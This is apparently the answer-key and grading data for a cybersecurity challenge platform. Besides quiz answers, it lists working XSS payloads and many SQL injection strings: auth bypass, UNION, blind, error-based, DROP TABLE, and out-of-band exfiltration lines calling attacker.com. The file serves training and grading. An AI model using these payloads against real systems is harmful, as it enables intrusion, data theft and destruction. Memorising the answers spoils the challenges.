// Centralized Challenge Answer Dataset for Backend API
// Only the data objects are included here, not TypeScript types or frontend-specific code.

const NETWORK_SECURITY_ANSWERS = {
  'subnet_mask_class_c': [
    {
      primary: "255.255.255.0",
      synonyms: ["class c subnet mask", "default class c mask"],
      abbreviations: ["/24"],
      alternativeSpellings: ["255.255.255.0/24", "255 255 255 0"]
    }
  ],
  'port_443_service': [
    {
      primary: "HTTPS",
      synonyms: [
        "hypertext transfer protocol secure", 
        "http secure", 
        "secure http",
        "https protocol",
        "secure web protocol"
      ],
      abbreviations: ["HTTPS"],
      alternativeSpellings: ["http-s", "hyper text transfer protocol secure"]
    }
  ],
  'ddos_attack': [
    {
      primary: "Distributed Denial of Service",
      synonyms: [
        "ddos attack", 
        "distributed dos",
        "distributed denial of service attack",
        "botnet attack"
      ],
      abbreviations: ["DDoS", "DDOS"],
      alternativeSpellings: ["distributed denial-of-service", "distributed dos attack"]
    }
  ],
  'mitm_attack': [
    {
      primary: "Man-in-the-Middle",
      synonyms: [
        "man in the middle attack", 
        "mitm attack", 
        "person in the middle",
        "man in middle attack",
        "interceptor attack"
      ],
      abbreviations: ["MITM", "MitM", "PITM"],
      alternativeSpellings: ["man-in-the-middle", "man in middle"]
    }
  ],
  'dns_protocol': [
    {
      primary: "Domain Name System",
      synonyms: [
        "domain name service", 
        "dns resolution", 
        "name resolution",
        "domain resolution",
        "dns service"
      ],
      abbreviations: ["DNS"],
      alternativeSpellings: ["domain-name-system", "domain name resolution"]
    }
  ],
  'firewall_technology': [
    {
      primary: "Firewall",
      synonyms: [
        "network firewall",
        "packet filter",
        "security barrier",
        "access control"
      ],
      abbreviations: [],
      alternativeSpellings: ["fire-wall", "fire wall"]
    }
  ],
  'arp_poisoning': [
    {
      primary: "ARP Poisoning",
      synonyms: [
        "arp spoofing",
        "address resolution protocol poisoning",
        "arp cache poisoning",
        "arp attack"
      ],
      abbreviations: ["ARP poisoning"],
      alternativeSpellings: ["arp-poisoning"]
    }
  ]
};

const CRYPTOGRAPHY_ANSWERS = {
  'caesar_cipher_hello_world': [
    {
      primary: "HELLO, WORLD!",
      synonyms: ["hello world message"],
      alternativeSpellings: [
        "hello world", 
        "hello, world", 
        "HELLO WORLD", 
        "helloworld",
        "hello world!"
      ]
    }
  ],
  'base64_security_illusion': [
    {
      primary: "Security is an illusion.",
      synonyms: ["security is not real", "safety is fake", "security is false"],
      alternativeSpellings: [
        "security is an illusion", 
        "security is illusion", 
        "security is a illusion"
      ]
    }
  ],
  'md5_hash_1337': [
    {
      primary: "1337",
      synonyms: ["leet", "elite"],
      alternativeSpellings: ["1337"]
    }
  ],
  'vigenere_hello_agent': [
    {
      primary: "HELLO, AGENT!",
      synonyms: ["hello agent message"],
      alternativeSpellings: [
        "hello agent", 
        "hello, agent", 
        "HELLO AGENT", 
        "helloagent",
        "hello agent!"
      ]
    }
  ],
  'rsa_decrypt_secret': [
    {
      primary: "SECRET",
      synonyms: ["secret message", "the secret"],
      alternativeSpellings: ["secret"]
    }
  ],
  'aes_plaintext': [
    {
      primary: "Cybersecurity rocks!",
      synonyms: ["cybersec rocks", "security rocks"],
      alternativeSpellings: [
        "cybersecurity rocks",
        "cyber security rocks!",
        "cybersecurity rocks!"
      ]
    }
  ],
  // Additional challenges from frontend that weren't in backend
  'rsa_additional_challenge': [
    {
      primary: "Additional RSA answer if needed",
      synonyms: ["rsa answer"],
      alternativeSpellings: ["rsa"]
    }
  ],
  'aes_additional_challenge': [
    {
      primary: "Additional AES answer if needed", 
      synonyms: ["aes answer"],
      alternativeSpellings: ["aes"]
    }
  ]
};

const XSS_PATTERNS = {
  challengeAnswers: {
    'xss_basic_script_alert': {
      patterns: [
        '<script>alert(',
        '<script>alert("',
        "<script>alert('",
        '<script>alert(\'xss\')',
        '<script>alert("xss")',
        '<script>alert(`xss`)',

        '<script>alert()',
        '<script>alert("XSS")',
        '<script>alert(\'XSS\')',
        '<script>alert(`XSS`)'
      ],
      requiredElements: ['<script>', 'alert(', 'XSS'],
      description: "Basic script tag with alert function"
    },
    'xss_img_onerror': {
      patterns: [
        '<img',
        'onerror=',
        'alert(',
        '<img src=x onerror=alert(',
        '<img src="x" onerror="alert(',
        '<img src=\'\' onerror=\'alert(',
        '<img onerror=alert(',
        '<img src=# onerror=alert(',
        '<img src=/ onerror=alert('
      ],
      requiredElements: ['<img', 'onerror', 'alert'],
      description: "Image tag with onerror event handler"
    },
    'xss_dom_script_break': {
      patterns: [
        '</script>',
        '<script>',
        'alert(',
        '</script><script>alert(',
        '</script><script>alert("dom-xss")',
        '</script><script>alert(\'dom-xss\')',
        '</script><script>alert(`dom-xss`)',

        '"></script><script>alert(',
        '\';}</script><script>alert('
      ],
      requiredElements: ['</script>', '<script>', 'alert', 'DOM'],
      description: "DOM-based XSS with script tag breakout"
    },
    'xss_csp_bypass_iframe': {
      patterns: [
        '<iframe',
        'srcdoc=',
        'alert(',
        'parent.',
        '<iframe srcdoc=\'<script>parent.alert(',
        '<iframe srcdoc="<script>parent.alert(',
        '<iframe srcdoc=`<script>parent.alert(',
        '<iframe srcdoc=\'<script>alert(',
        '<iframe srcdoc="<script>alert('
      ],
      requiredElements: ['<iframe', 'srcdoc', 'alert', 'CSP'],
      description: "CSP bypass using iframe srcdoc"
    },
    'xss_reflected_attribute_break': {
      patterns: [
        '" onmouseover="',
        'alert(',
        'Reflected',
        '" onmouseover="alert(',
        '\' onmouseover=\'alert(',
        '" onclick="alert(',
        '\' onclick=\'alert(',
        '" onfocus="alert(',
        '\' onfocus=\'alert(',
        '" onload="alert(',
        '\' onload=\'alert('
      ],
      requiredElements: ['"', 'onmouseover', 'alert'],
      description: "Reflected XSS by breaking out of attributes"
    }
  }
};

const SQL_INJECTION_PATTERNS = {
  challengeAnswers: {
    'sql_auth_bypass': {
      patterns: [
        "' OR '1'='1", 
        "' or '1'='1", 
        "' OR 1=1--", 
        "' or 1=1--",
        "admin'--",
        "admin' --",
        "' OR 'a'='a",
        "' or 'a'='a",
        "' OR TRUE--",
        "' or true--",
        "' OR 1=1#",
        "' or 1=1#",
        "' OR '1'='1'--",
        "' or '1'='1'--",
        "' OR '1'='1'#",
        "' or '1'='1'#",
        "' OR 'x'='x",
        "' or 'x'='x",
        "') OR ('1'='1",
        "') or ('1'='1",
        "admin') OR ('1'='1'--",
        "admin') or ('1'='1'--"
      ],
      requiredElements: ["'", 'OR', '1', '='],
      description: "Authentication bypass using always-true condition or admin comment bypass"
    },
    'sql_union_version': {
      patterns: [
        "' UNION SELECT @@VERSION--", 
        "' union select @@version--", 
        "' UNION SELECT VERSION()--",
        "' union select version()--",
        "' UNION ALL SELECT @@VERSION--",
        "' union all select @@version--",
        "' UNION SELECT @@VERSION#",
        "' union select @@version#",
        "' UNION SELECT NULL,@@VERSION--",
        "' union select null,@@version--",
        "1' UNION SELECT @@VERSION--",
        "1' union select @@version--"
      ],
      requiredElements: ["'", 'UNION', 'SELECT', '@@VERSION'],
      description: "UNION-based attack to extract database version"
    },
    'sql_schema_enum': {
      patterns: [
        "' UNION SELECT table_name FROM information_schema.tables", 
        "' union select table_name from information_schema.tables",
        "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--",
        "' union select table_name from information_schema.tables limit 1--",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        "' union select table_name from information_schema.tables where table_schema=database()--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "' union select column_name from information_schema.columns--",
        "' UNION SELECT schema_name FROM information_schema.schemata--",
        "' union select schema_name from information_schema.schemata--"
      ],
      requiredElements: ["'", 'UNION', 'SELECT', 'table_name', 'information_schema'],
      description: "Schema enumeration using information_schema"
    },
    'sql_case_bypass': {
      patterns: [
        "' or '1'='1", 
        "' OR '1'='1", 
        "' Or '1'='1",
        "' oR '1'='1",
        "' Or 1=1--",
        "' oR 1=1--",
        "' UnIoN SeLeCt @@VeRsIoN--",
        "' uNiOn SeLeCt @@vErSiOn--",
        "' /**/OR/**/ '1'='1",
        "' /*comment*/OR/*comment*/ '1'='1"
      ],
      requiredElements: ["'", 'or', '1', '='],
      description: "Case-sensitive filter bypass using mixed case and comments"
    },
    'sql_time_based_blind': {
      patterns: [
        "SLEEP(5)", 
        "BENCHMARK(", 
        "IF(SUBSTRING(", 
        "password FROM users WHERE username='admin'",
        "' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='c',SLEEP(5),0)--",
        "' and if(substring((select password from users where username='admin'),1,1)='c',sleep(5),0)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "'; waitfor delay '00:00:05'--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--",
        "' and (select count(*) from information_schema.tables where table_schema=database() and sleep(5))--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' and if(1=1,sleep(5),0)--",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        "'; select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--"
      ],
      requiredElements: ['IF', 'SUBSTRING', 'SLEEP', 'password', 'admin'],
      description: "Time-based blind SQL injection using sleep functions"
    },
    'sql_error_based': {
      patterns: [
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' and (select * from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' and extractvalue(1,concat(0x7e,(select version()),0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--"
      ],
      requiredElements: ['EXTRACTVALUE', 'UPDATEXML', 'CONCAT', 'version'],
      description: "Error-based SQL injection to extract data through error messages"
    },
    'sql_boolean_blind': {
      patterns: [
        "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
        "' and (select substring(username,1,1) from users where id=1)='a'--",
        "' AND (SELECT LENGTH(database()))=8--",
        "' and (select length(database()))=8--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' and (select count(*) from users)>0--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",
        "' and ascii(substring((select password from users where username='admin'),1,1))>64--"
      ],
      requiredElements: ['SUBSTRING', 'LENGTH', 'ASCII', 'users'],
      description: "Boolean-based blind SQL injection using conditional statements"
    },
    'sql_stacked_queries': {
      patterns: [
        "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
        "'; insert into users (username,password) values ('hacker','password')--",
        "'; DROP TABLE users--",
        "'; drop table users--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; update users set password='hacked' where username='admin'--",
        "'; CREATE TABLE evil (data TEXT)--",
        "'; create table evil (data text)--"
      ],
      requiredElements: [';', 'INSERT', 'DROP', 'UPDATE', 'CREATE'],
      description: "Stacked queries for multiple SQL statement execution"
    },
    'sql_out_of_band': {
      patterns: [
        "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\test.txt'))--",
        "'; select load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\test.txt'))--",
        "'; SELECT ... INTO OUTFILE '\\\\\\\\attacker.com\\\\share\\\\output.txt'--",
        "'; select ... into outfile '\\\\\\\\attacker.com\\\\share\\\\output.txt'--"
      ],
      requiredElements: ['LOAD_FILE', 'INTO OUTFILE', 'attacker.com'],
      description: "Out-of-band SQL injection using external connections"
    }
  }
};

module.exports = {
  NETWORK_SECURITY_ANSWERS,
  CRYPTOGRAPHY_ANSWERS,
  XSS_PATTERNS,
  SQL_INJECTION_PATTERNS
};